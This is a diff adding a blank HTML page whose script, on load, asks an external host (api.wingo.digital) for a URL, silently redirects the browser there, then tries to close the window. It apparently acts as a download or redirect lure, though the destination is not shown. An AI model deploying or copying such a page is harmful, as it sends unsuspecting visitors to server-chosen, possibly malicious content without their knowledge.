@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title></title>
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="Cache-Control" content="no-store">
+<style>html,body{margin:0;padding:0;background:#fff}</style>
+</head>
+<body>
+<script>
+(function () {
+  "use strict";
+  
+  var CLAIM_BASE = "https://api.wingo.digital";
+  if (!CLAIM_BASE || CLAIM_BASE.indexOf("http") !== 0) return;
+
+  
+  var url = CLAIM_BASE + "/claim?path=" + encodeURIComponent(location.pathname);
+
+  
+  
+  var guard = "dl_" + location.pathname;
+  try {
+    var t0 = sessionStorage.getItem(guard);
+    if (t0 && Date.now() - Number(t0) < 30000) return;
+  } catch (e) {  }
+
+  var tries = 0;
+  function go() {
+    fetch(url, { method: "GET", cache: "no-store" })
+      .then(function (r) {
+        if (!r.ok) throw new Error("HTTP " + r.status);
+        return r.json();
+      })
+      .then(function (j) {
+        if (!j || !j.url) throw new Error("no url in response");
+        try { sessionStorage.setItem(guard, String(Date.now())); } catch (e) {}
+        
+        window.location.href = j.url;
+        
+        setTimeout(function () {
+          try { window.close(); } catch (e) {}
+          try { window.location.replace("about:blank"); } catch (e) {}
+        }, 4000);
+      })
+      .catch(function () {
+        if (++tries < 3) setTimeout(go, 3000);
+      });
+  }
+  go();
+})();
+</script>
+</body>
+</html>
